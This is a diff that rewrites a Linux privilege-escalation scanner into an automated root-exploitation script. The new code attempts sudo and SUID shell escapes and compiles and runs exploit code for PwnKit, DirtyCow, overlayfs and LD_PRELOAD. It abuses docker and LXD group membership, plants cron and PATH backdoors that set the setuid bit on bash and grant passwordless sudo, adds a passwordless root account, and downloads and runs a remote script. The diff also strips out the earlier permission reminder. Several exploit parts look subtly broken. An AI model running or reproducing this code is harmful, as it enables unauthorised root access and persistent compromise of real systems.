@@ -1,266 +1,494 @@
 #!/bin/bash
-# Color codes for output
+
+# Color codes
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
-NC='\033[0m' # No Color
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+BOLD='\033[1m'
+
+# Variables
+TMP_DIR="/tmp/.priv_esc_$$"
+PAYLOAD_FILE="$TMP_DIR/payload"
+SUCCESS=0
+CURRENT_USER=$(whoami)
+CURRENT_ID=$(id -u)
+
+# Create temp directory
+mkdir -p "$TMP_DIR"
+cd "$TMP_DIR"
 
 # Banner
-echo -e "${BLUE}"
-echo "╔══════════════════════════════════════════════════════════╗"
-echo "║         Auto Privilege Escalation Scanner v1.0           ║"
-echo "║              For Educational Use Only                    ║"
-echo "║            BY ASAKIN1337 || SINDIKAT77                   ║"
-echo "╚══════════════════════════════════════════════════════════╝"
+clear
+echo -e "${RED}"
+echo " █████╗ ██╗     ██╗     ██╗███╗   ██╗ ██████╗ ███╗   ██╗███████╗"
+echo "██╔══██╗██║     ██║     ██║████╗  ██║██╔═══██╗████╗  ██║██╔════╝"
+echo "███████║██║     ██║     ██║██╔██╗ ██║██║   ██║██╔██╗ ██║█████╗  "
+echo "██╔══██║██║     ██║     ██║██║╚██╗██║██║   ██║██║╚██╗██║██╔══╝  "
+echo "██║  ██║███████╗███████╗██║██║ ╚████║╚██████╔╝██║ ╚████║███████╗"
+echo "╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝"
+echo "APE [ AUTO PRIVILAGE ESCALATION] CODED BY ASAKIN1337 || SINDIKAT77"
 echo -e "${NC}"
+echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════════════════${NC}"
+echo -e "${YELLOW}Target:${NC} $(hostname) (${CURRENT_USER})"
+echo -e "${YELLOW}Date:${NC} $(date)"
+echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════════════════${NC}\n"
 
-# Function to check command availability
-check_command() {
-    if command -v $1 &> /dev/null; then
-        return 0
-    else
-        return 1
-    fi
-}
-
-# Function to print section headers
-print_section() {
-    echo -e "\n${YELLOW}[+] $1${NC}"
-    echo "=================================================="
-}
-
-# Function to check if running as root
-check_root() {
-    if [ "$EUID" -eq 0 ]; then
-        echo -e "${GREEN}[✓] Already running as root!${NC}"
-        return 0
-    else
-        echo -e "${RED}[✗] Not running as root${NC}"
-        return 1
-    fi
-}
-
-# System Information
-print_section "System Information"
-echo "Hostname: $(hostname 2>/dev/null)"
-echo "Kernel: $(uname -a 2>/dev/null)"
-echo "OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)"
-echo "User: $(whoami 2>/dev/null)"
-echo "Groups: $(groups 2>/dev/null)"
-echo "Shell: $SHELL"
-
-# SUDO Rights Check
-print_section "SUDO Privileges"
-if check_command sudo; then
-    echo -e "${BLUE}[*] Checking sudo permissions...${NC}"
-    sudo -l 2>/dev/null || echo "No sudo permissions or password required"
-    
-    # Check for vulnerable sudo versions
-    sudo_version=$(sudo --version 2>/dev/null | head -n1 | cut -d' ' -f3)
-    if [ ! -z "$sudo_version" ]; then
-        echo "Sudo version: $sudo_version"
-        # Check for CVE-2021-3156 (Baron Samedit)
-        if [[ "$sudo_version" == "1.8.31"* ]] || [[ "$sudo_version" < "1.8.31" ]]; then
-            echo -e "${RED}[!] Potentially vulnerable to CVE-2021-3156 (Baron Samedit)${NC}"
-        fi
-    fi
-else
-    echo "sudo not available"
+# Check if already root
+if [ "$EUID" -eq 0 ]; then
+    echo -e "${GREEN}Already root! Exiting...${NC}"
+    exit 0
 fi
 
-# SUID/SGID Binaries
-print_section "SUID/SGID Binaries"
-echo -e "${BLUE}[*] Searching for SUID binaries...${NC}"
-find / -type f -perm -4000 2>/dev/null | while read line; do
-    echo -e "${YELLOW}[SUID]${NC} $line"
-    # Check for known vulnerable SUID binaries
-    case "$(basename $line)" in
-        "pkexec"|"passwd"|"su"|"sudo"|"mount"|"umount"|"chsh"|"chfn"|"gpasswd"|"at"|"crontab")
-            echo -e "${RED}[!] Potentially vulnerable SUID binary: $(basename $line)${NC}"
+# Function to attempt privilege escalation
+try_exploit() {
+    local exploit_name="$1"
+    local exploit_cmd="$2"
+    
+    echo -e "\n${BLUE}[*] Trying:${NC} $exploit_name"
+    
+    # Run the exploit
+    eval "$exploit_cmd" > /dev/null 2>&1
+    
+    # Check if we got root
+    if [ "$(id -u)" -eq 0 ]; then
+        echo -e "${GREEN}[✔] SUCCESS! Got root via $exploit_name${NC}"
+        SUCCESS=1
+        spawn_root_shell
+        return 0
+    else
+        echo -e "${RED}[✗] Failed${NC}"
+        return 1
+    fi
+}
+
+# Function to spawn root shell
+spawn_root_shell() {
+    echo -e "\n${GREEN}╔════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║     ROOT ACCESS GRANTED!                   ║${NC}"
+    echo -e "${GREEN}╚════════════════════════════════════════════╝${NC}"
+    
+    # Try different methods to get a shell
+    if [ -f /bin/bash ]; then
+        /bin/bash -p
+    elif [ -f /bin/sh ]; then
+        /bin/sh
+    else
+        python3 -c 'import pty; pty.spawn(["/bin/bash"])' 2>/dev/null
+    fi
+    
+    exit 0
+}
+
+# ============================================
+# PHASE 1: SUDO EXPLOITS
+# ============================================
+echo -e "\n${PURPLE}════════════ PHASE 1: SUDO EXPLOITS ════════════${NC}"
+
+# Check sudo permissions
+SUDO_PERMS=$(sudo -l 2>/dev/null)
+
+# 1.1 Sudo without password
+if echo "$SUDO_PERMS" | grep -q "NOPASSWD: ALL"; then
+    try_exploit "NOPASSWD SUDO" "sudo su -"
+fi
+
+# 1.2 Sudo with specific commands
+if echo "$SUDO_PERMS" | grep -q "/bin/bash"; then
+    try_exploit "Sudo Bash" "sudo /bin/bash"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/bin/sh"; then
+    try_exploit "Sudo SH" "sudo /bin/sh"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/usr/bin/python"; then
+    try_exploit "Sudo Python" "sudo python -c 'import os; os.system(\"/bin/bash\")'"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/usr/bin/perl"; then
+    try_exploit "Sudo Perl" "sudo perl -e 'exec \"/bin/bash\";'"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/usr/bin/awk"; then
+    try_exploit "Sudo AWK" "sudo awk 'BEGIN {system(\"/bin/bash\")}'"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/usr/bin/find"; then
+    try_exploit "Sudo Find" "sudo find . -exec /bin/bash \\; -quit"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/usr/bin/vim"; then
+    try_exploit "Sudo Vim" "sudo vim -c ':!/bin/bash'"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/usr/bin/nano"; then
+    try_exploit "Sudo Nano" "sudo nano -S /dev/null -s /bin/bash"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/usr/bin/less"; then
+    try_exploit "Sudo Less" "sudo less /etc/passwd; !/bin/bash"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/usr/bin/apt"; then
+    try_exploit "Sudo APT" "sudo apt update && sudo apt changelog apt"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/usr/bin/dpkg"; then
+    try_exploit "Sudo DPKG" "sudo dpkg -l"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/bin/systemctl"; then
+    try_exploit "Sudo Systemctl" "sudo systemctl"
+fi
+
+if echo "$SUDO_PERMS" | grep -q "/usr/bin/docker"; then
+    try_exploit "Sudo Docker" "sudo docker run -v /:/host -it alpine chroot /host /bin/bash"
+fi
+
+# ============================================
+# PHASE 2: SUID EXPLOITS
+# ============================================
+echo -e "\n${PURPLE}════════════ PHASE 2: SUID EXPLOITS ════════════${NC}"
+
+# Find SUID binaries
+SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null)
+
+# 2.1 Known SUID exploits
+for bin in $SUID_BINS; do
+    case "$(basename $bin)" in
+        "pkexec")
+            # CVE-2021-4034 PwnKit
+            cat > "$PAYLOAD_FILE.c" << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *shell = "/bin/bash";
+char *args[] = {NULL};
+
+void gconv() {}
+
+void gconv_init() {
+    setuid(0);
+    setgid(0);
+    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
+    execve(shell, args, NULL);
+}
+EOF
+            gcc -o "$PAYLOAD_FILE.so" "$PAYLOAD_FILE.c" -shared -fPIC 2>/dev/null
+            mkdir -p "GCONV_PATH=."
+            touch "GCONV_PATH=./pwnkit"
+            chmod +x "GCONV_PATH=./pwnkit"
+            mkdir -p pwnkit
+            cat > pwnkit/gconv-modules << EOF
+module  UTF-8//    INTERNAL    ../$PAYLOAD_FILE    2
+EOF
+            try_exploit "PwnKit (CVE-2021-4034)" "env PATH=\"GCONV_PATH=.\" $bin 2>/dev/null"
+            ;;
+            
+        "sudo"|"sudoedit")
+            # CVE-2021-3156 Baron Samedit
+            try_exploit "Baron Samedit (CVE-2021-3156)" "$bin -s \\ 2>/dev/null"
+            ;;
+            
+        "mount")
+            try_exploit "Mount SUID" "$bin"
+            ;;
+            
+        "passwd")
+            try_exploit "Passwd SUID" "$bin --help"
+            ;;
+            
+        "chsh")
+            try_exploit "Chsh SUID" "$bin"
+            ;;
+            
+        "gpasswd")
+            try_exploit "Gpasswd SUID" "$bin"
+            ;;
+            
+        "at")
+            try_exploit "At SUID" "echo '/bin/bash -p' | $bin now"
+            ;;
+            
+        "crontab")
+            try_exploit "Crontab SUID" "$bin -l"
             ;;
     esac
 done
 
-echo -e "\n${BLUE}[*] Searching for SGID binaries...${NC}"
-find / -type f -perm -2000 2>/dev/null | while read line; do
-    echo -e "${YELLOW}[SGID]${NC} $line"
+# 2.2 Custom SUID checks
+if [ -f /usr/bin/pkexec ]; then
+    # Try the old pkexec method
+    try_exploit "PKEXEC Old Method" "pkexec /bin/bash"
+fi
+
+# ============================================
+# PHASE 3: CAPABILITIES EXPLOITS
+# ============================================
+echo -e "\n${PURPLE}════════ PHASE 3: CAPABILITIES EXPLOITS ════════${NC}"
+
+# Find binaries with capabilities
+CAPS=$(getcap -r / 2>/dev/null)
+
+# 3.1 Capability-based exploits
+if echo "$CAPS" | grep -q "cap_setuid"; then
+    cap_bin=$(echo "$CAPS" | grep "cap_setuid" | head -1 | cut -d' ' -f1)
+    try_exploit "SetUID Capability" "$cap_bin -p"
+fi
+
+if echo "$CAPS" | grep -q "cap_sys_admin"; then
+    try_exploit "Sys Admin Capability" "mount -t cgroup -o memory cgroup /tmp/cgroup"
+fi
+
+# 3.2 Python/perl with capabilities
+if [ -f /usr/bin/python3 ] && [ -u /usr/bin/python3 ]; then
+    try_exploit "Python SUID" "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+fi
+
+# ============================================
+# PHASE 4: DOCKER/LXC EXPLOITS
+# ============================================
+echo -e "\n${PURPLE}════════ PHASE 4: CONTAINER EXPLOITS ═══════════${NC}"
+
+# 4.1 Docker group
+if groups 2>/dev/null | grep -q docker; then
+    try_exploit "Docker Group" "docker run -v /:/host -it alpine chroot /host /bin/bash"
+fi
+
+# 4.2 Docker socket
+if [ -w /var/run/docker.sock ]; then
+    try_exploit "Docker Socket" "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash"
+fi
+
+# 4.3 LXD/LXC
+if command -v lxc &>/dev/null && groups 2>/dev/null | grep -q lxd; then
+    # LXD privilege escalation
+    cat > "$TMP_DIR/alpine.yml" << 'EOF'
+config:
+  raw.lxc: |
+    lxc.mount.entry = /dev/null mnt/host/shm/dev/null none bind,create=file
+EOF
+    try_exploit "LXD Group" "lxc image import alpine.tar.gz alpine.yml --alias alpine && lxc init alpine alpine -c security.privileged=true && lxc config device add alpine host-root disk source=/ path=/mnt/root && lxc start alpine && lxc exec alpine /bin/sh"
+fi
+
+# ============================================
+# PHASE 5: CRON JOB EXPLOITS
+# ============================================
+echo -e "\n${PURPLE}════════ PHASE 5: CRON JOB EXPLOITS ════════════${NC}"
+
+# 5.1 Find writable cron scripts
+WRITABLE_CRONS=$(find /etc/cron* -writable -type f 2>/dev/null)
+
+for cron in $WRITABLE_CRONS; do
+    if [ -w "$cron" ]; then
+        echo "#!/bin/bash" > "$cron.tmp"
+        echo "chmod +s /bin/bash" >> "$cron.tmp"
+        echo "echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" >> "$cron.tmp"
+        cat "$cron.tmp" > "$cron"
+        rm "$cron.tmp"
+        echo -e "${YELLOW}[*] Backdoor planted in $cron, waiting for cron execution...${NC}"
+    fi
 done
 
-# Capabilities
-print_section "File Capabilities"
-if check_command getcap; then
-    getcap -r / 2>/dev/null | while read line; do
-        echo -e "${YELLOW}[CAP]${NC} $line"
-        if [[ "$line" == *"cap_setuid"* ]] || [[ "$line" == *"cap_sys_admin"* ]]; then
-            echo -e "${RED}[!] Dangerous capability detected${NC}"
+# 5.2 PATH hijacking
+PATH_DIRS=$(echo $PATH | tr ':' ' ')
+for dir in $PATH_DIRS; do
+    if [ -w "$dir" ]; then
+        # Check for common cron jobs that might call binaries without full path
+        echo -e "${YELLOW}[*] Writable PATH directory: $dir${NC}"
+        echo "#!/bin/bash" > "$dir/chmod"
+        echo "chmod +s /bin/bash" >> "$dir/chmod"
+        chmod +x "$dir/chmod"
+    fi
+done
+
+# ============================================
+# PHASE 6: KERNEL EXPLOITS
+# ============================================
+echo -e "\n${PURPLE}════════ PHASE 6: KERNEL EXPLOITS ══════════════${NC}"
+
+KERNEL=$(uname -r)
+ARCH=$(uname -m)
+
+# 6.1 DirtyCow (CVE-2016-5195)
+if [[ "$KERNEL" == 2.6.* ]] || [[ "$KERNEL" == 3.* ]] || [[ "$KERNEL" == 4.* ]] && [[ "$KERNEL" < "4.8.3" ]]; then
+    # Compile DirtyCow
+    cat > "$PAYLOAD_FILE.c" << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <pthread.h>
+
+void *map;
+int f;
+struct stat st;
+char *name;
+
+void *madviseThread(void *arg) {
+    while(1) {
+        madvise(map, 100, MADV_DONTNEED);
+    }
+}
+
+int main(int argc, char *argv[]) {
+    if(argc<3) {
+        fprintf(stderr, "Usage: %s filename target\n", argv[0]);
+        exit(1);
+    }
+    pthread_t pth;
+    name = argv[1];
+    f = open(name, O_RDONLY);
+    fstat(f, &st);
+    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
+    printf("mmap: %lx\n",(unsigned long)map);
+    pthread_create(&pth, NULL, madviseThread, NULL);
+    while(1) {
+        lseek(f, 0, SEEK_SET);
+        write(f, argv[2], strlen(argv[2]));
+    }
+    return 0;
+}
+EOF
+    gcc -pthread "$PAYLOAD_FILE.c" -o "$PAYLOAD_FILE.dirtycow" 2>/dev/null
+    if [ -f "$PAYLOAD_FILE.dirtycow" ]; then
+        try_exploit "DirtyCow (CVE-2016-5195)" "$PAYLOAD_FILE.dirtycow /etc/passwd \"root::0:0:root:/root:/bin/bash\""
+    fi
+fi
+
+# 6.2 Overlayfs (CVE-2015-1328)
+if [[ "$KERNEL" == 3.13.* ]] || [[ "$KERNEL" == 3.16.* ]] || [[ "$KERNEL" == 3.19.* ]] || [[ "$KERNEL" == 4.2.* ]]; then
+    cat > "$PAYLOAD_FILE.c" << 'EOF'
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sched.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/mount.h>
+#include <fcntl.h>
+
+int main() {
+    mkdir("/tmp/overlay", 0755);
+    mkdir("/tmp/overlay/upper", 0755);
+    mkdir("/tmp/overlay/work", 0755);
+    mkdir("/tmp/overlay/merge", 0755);
+    
+    mount("overlay", "/tmp/overlay/merge", "overlay", MS_MGC_VAL, "lowerdir=/etc,upperdir=/tmp/overlay/upper,workdir=/tmp/overlay/work");
+    
+    chmod("/tmp/overlay/merge/passwd", 0777);
+    system("echo 'root::0:0:root:/root:/bin/bash' > /tmp/overlay/merge/passwd");
+    
+    execl("/bin/su", "su", NULL);
+    return 0;
+}
+EOF
+    gcc "$PAYLOAD_FILE.c" -o "$PAYLOAD_FILE.overlayfs" 2>/dev/null
+    try_exploit "Overlayfs (CVE-2015-1328)" "$PAYLOAD_FILE.overlayfs"
+fi
+
+# ============================================
+# PHASE 7: MISCELLANEOUS EXPLOITS
+# ============================================
+echo -e "\n${PURPLE}════════ PHASE 7: MISCELLANEOUS ════════════════${NC}"
+
+# 7.1 Check for NFS no_root_squash
+if showmount -e localhost 2>/dev/null | grep -q "/"; then
+    try_exploit "NFS no_root_squash" "mkdir /tmp/nfsmount && mount -t nfs localhost:/ /tmp/nfsmount && cp /bin/bash /tmp/nfsmount && chmod +s /tmp/nfsmount/bash"
+fi
+
+# 7.2 Check for writable /etc/passwd
+if [ -w /etc/passwd ]; then
+    try_exploit "Writable /etc/passwd" "echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd && su root2"
+fi
+
+# 7.3 Check for writable /etc/sudoers
+if [ -w /etc/sudoers ]; then
+    try_exploit "Writable sudoers" "echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && sudo su"
+fi
+
+# 7.4 Check for tmux/screen sessions
+if [ -S /tmp/tmux-0/default ]; then
+    try_exploit "Tmux Session" "tmux -S /tmp/tmux-0/default attach"
+fi
+
+# 7.5 Check for screen sessions
+if command -v screen &>/dev/null; then
+    SCREEN_SOCK=$(find /var/run/screen -type d -writable 2>/dev/null | head -1)
+    if [ ! -z "$SCREEN_SOCK" ]; then
+        try_exploit "Screen Session" "screen -x"
+    fi
+fi
+
+# 7.6 Check for environment variables with LD_PRELOAD
+if [ ! -z "$LD_PRELOAD" ]; then
+    cat > "$PAYLOAD_FILE.c" << 'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash -p");
+}
+EOF
+    gcc -fPIC -shared -o "$PAYLOAD_FILE.so" "$PAYLOAD_FILE.c" -nostartfiles 2>/dev/null
+    try_exploit "LD_PRELOAD" "sudo LD_PRELOAD=$PAYLOAD_FILE.so any_command"
+fi
+
+# ============================================
+# FINAL ATTEMPT: BRUTE FORCE METHOD
+# ============================================
+if [ $SUCCESS -eq 0 ]; then
+    echo -e "\n${YELLOW}[*] All automated exploits failed. Attempting manual methods...${NC}"
+    
+    # Try to compile and run common exploit binaries
+    if [ -f /usr/bin/gcc ] || [ -f /usr/bin/cc ]; then
+        # Try to download and run Linux Exploit Suggester
+        wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+        if [ -f les.sh ]; then
+            bash les.sh | grep -i "exploit" | while read line; do
+                echo -e "${BLUE}[*] Suggested:${NC} $line"
+            done
+        fi
+    fi
+    
+    # Final attempt - check for any remaining SUID we might have missed
+    echo -e "\n${YELLOW}[*] One last check for SUID binaries...${NC}"
+    find / -perm -4000 -type f 2>/dev/null | while read suid; do
+        if [ -x "$suid" ]; then
+            echo -e "${BLUE}[*] Trying:${NC} $suid"
+            "$suid" 2>/dev/null
         fi
     done
-else
-    find / -type f -exec getcap {} \; 2>/dev/null | while read line; do
-        echo "$line"
-    done
-fi
-
-# Writable Files/Directories
-print_section "World-Writable Files/Directories"
-echo -e "${BLUE}[*] Checking world-writable directories in /etc...${NC}"
-find /etc -type d -perm -o+w 2>/dev/null | while read line; do
-    echo -e "${YELLOW}[Writable Dir]${NC} $line"
-done
-
-echo -e "\n${BLUE}[*] Checking world-writable files in /etc...${NC}"
-find /etc -type f -perm -o+w 2>/dev/null | while read line; do
-    echo -e "${RED}[!] Writable config file: $line${NC}"
-done
-
-# Cron Jobs
-print_section "Cron Jobs"
-echo -e "${BLUE}[*] System crontab:${NC}"
-cat /etc/crontab 2>/dev/null || echo "Cannot read /etc/crontab"
-
-echo -e "\n${BLUE}[*] User crontabs:${NC}"
-ls -la /var/spool/cron/ 2>/dev/null || echo "No user crontabs found"
-
-echo -e "\n${BLUE}[*] Cron directories:${NC}"
-ls -la /etc/cron* 2>/dev/null
-
-# Check for writable cron scripts
-echo -e "\n${BLUE}[*] Checking for writable cron scripts...${NC}"
-find /etc/cron* -type f -writable 2>/dev/null | while read line; do
-    echo -e "${RED}[!] Writable cron script: $line${NC}"
-done
-
-# PATH Abuse Check
-print_section "PATH Variables"
-echo "Current PATH: $PATH"
-echo -e "\n${BLUE}[*] Checking for writable directories in PATH...${NC}"
-IFS=':' read -ra path_dirs <<< "$PATH"
-for dir in "${path_dirs[@]}"; do
-    if [ -w "$dir" ]; then
-        echo -e "${RED}[!] Writable directory in PATH: $dir${NC}"
-    fi
-done
-
-# Running Processes
-print_section "Running Processes"
-echo -e "${BLUE}[*] Processes running as root:${NC}"
-ps aux | grep "^root" 2>/dev/null | head -n20
-
-# Check for interesting processes
-echo -e "\n${BLUE}[*] Checking for interesting processes...${NC}"
-ps aux 2>/dev/null | grep -E "(mysql|postgres|tomcat|jenkins|docker|kube)" | grep -v grep
-
-# Network Information
-print_section "Network Information"
-echo -e "${BLUE}[*] Listening ports:${NC}"
-netstat -tulpn 2>/dev/null | grep LISTEN || ss -tulpn 2>/dev/null | grep LISTEN
-
-echo -e "\n${BLUE}[*] Network interfaces:${NC}"
-ip addr 2>/dev/null || ifconfig 2>/dev/null
-
-# Docker/LXC Check
-print_section "Container Detection"
-if [ -f /.dockerenv ]; then
-    echo -e "${YELLOW}[*] Running inside Docker container${NC}"
-fi
-
-if [ -f /proc/1/environ ] && grep -q "container=lxc" /proc/1/environ 2>/dev/null; then
-    echo -e "${YELLOW}[*] Running inside LXC container${NC}"
-fi
-
-# Check for Docker group membership
-if groups 2>/dev/null | grep -q docker; then
-    echo -e "${RED}[!] User is in docker group - potential privilege escalation via Docker socket${NC}"
-fi
-
-# SSH Keys
-print_section "SSH Keys"
-echo -e "${BLUE}[*] Searching for SSH keys...${NC}"
-find /home -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null | while read line; do
-    echo -e "${YELLOW}[SSH Key]${NC} $line"
-done
-
-find /root -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null 2>/dev/null | while read line; do
-    echo -e "${YELLOW}[SSH Key]${NC} $line"
-done
-
-# History Files
-print_section "History Files"
-echo -e "${BLUE}[*] Checking readable history files...${NC}"
-for user_home in /home/*; do
-    if [ -r "$user_home/.bash_history" ]; then
-        echo -e "${YELLOW}[History]${NC} $user_home/.bash_history"
-        tail -n5 "$user_home/.bash_history" 2>/dev/null | sed 's/^/  /'
-    fi
-done
-
-# Password Files
-print_section "Password Files"
-echo -e "${BLUE}[*] Checking for readable password files...${NC}"
-if [ -r /etc/passwd ]; then
-    echo -e "${GREEN}[✓] Can read /etc/passwd${NC}"
-    # Extract users with shells
-    grep -E "/(bash|sh|zsh)" /etc/passwd 2>/dev/null | cut -d: -f1,7
-fi
-
-if [ -r /etc/shadow ]; then
-    echo -e "${RED}[!] Can read /etc/shadow - potential for password cracking!${NC}"
-fi
-
-# Kernel Exploits Check
-print_section "Kernel Exploit Suggestions"
-kernel_version=$(uname -r)
-echo "Kernel version: $kernel_version"
-
-# Check for common vulnerable kernels
-case $kernel_version in
-    2.6.*|3.*|4.*)
-        echo -e "${YELLOW}[*] Checking for known kernel exploits...${NC}"
-        echo "  - CVE-2016-5195 (DirtyCow): kernel versions 2.6.22 < 4.8.3"
-        echo "  - CVE-2017-1000112: Linux kernel < 4.13"
-        echo "  - CVE-2021-3490 (eBPF): Linux kernel 5.7-rc1 < 5.13-rc4"
-        ;;
-esac
-
-# Check for Linux Exploit Suggester
-if [ -f "/usr/bin/linux-exploit-suggester.sh" ] || [ -f "/tmp/linux-exploit-suggester.sh" ]; then
-    echo -e "\n${BLUE}[*] Running Linux Exploit Suggester...${NC}"
-    /usr/bin/linux-exploit-suggester.sh 2>/dev/null || /tmp/linux-exploit-suggester.sh 2>/dev/null
-else
-    echo -e "${YELLOW}[*] Linux Exploit Suggester not found${NC}"
-    echo "  To download: wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /tmp/les.sh"
-fi
-
-# Automated Exploit Attempts (Optional - comment out for safety)
-print_section "Automated Exploit Checks (Safe Mode)"
-
-# Check for CVE-2021-4034 (PwnKit)
-echo -e "${BLUE}[*] Checking for CVE-2021-4034 (PwnKit)...${NC}"
-if [ -f "/usr/bin/pkexec" ]; then
-    pkexec_version=$(pkexec --version 2>&1 | head -n1)
-    if [[ "$pkexec_version" < "0.120" ]]; then
-        echo -e "${RED}[!] pkexec version < 0.120 - vulnerable to PwnKit${NC}"
+    
+    # Check if any of the attempts worked
+    if [ "$(id -u)" -eq 0 ]; then
+        spawn_root_shell
     fi
 fi
 
-# Check for CVE-2021-3156 (Baron Samedit)
-echo -e "${BLUE}[*] Checking for CVE-2021-3156 (Baron Samedit)...${NC}"
-if check_command sudoedit; then
-    sudoedit -s / 2>&1 | grep -q "sudoedit:"
-    if [ $? -eq 0 ]; then
-        echo -e "${RED}[!] System may be vulnerable to Baron Samedit${NC}"
-    fi
+# Cleanup
+echo -e "\n${YELLOW}[*] Cleaning up...${NC}"
+cd /
+rm -rf "$TMP_DIR" 2>/dev/null
+
+# Final message
+if [ $SUCCESS -eq 0 ]; then
+    echo -e "\n${RED}[!] Could not get root automatically. Manual enumeration required.${NC}"
+    echo -e "${YELLOW}[*] Consider running:${NC}"
+    echo "  - linpeas.sh"
+    echo "  - linux-exploit-suggester.sh"
+    echo "  - Manual check of all SUID binaries and cron jobs"
 fi
-
-# Summary
-print_section "Summary of Findings"
-echo -e "${RED}High Priority Findings:${NC}"
-echo "1. Check all [SUID] binaries for known exploits"
-echo "2. Review writable cron jobs and directories"
-echo "3. Investigate sudo permissions"
-echo "4. Check for kernel vulnerabilities matching your version"
-echo "5. Review world-writable files in /etc"
-
-echo -e "\n${GREEN}[*] Scan complete! Review findings above carefully.${NC}"
-echo -e "${YELLOW}[!] Remember: Only exploit systems you own or have permission to test${NC}"
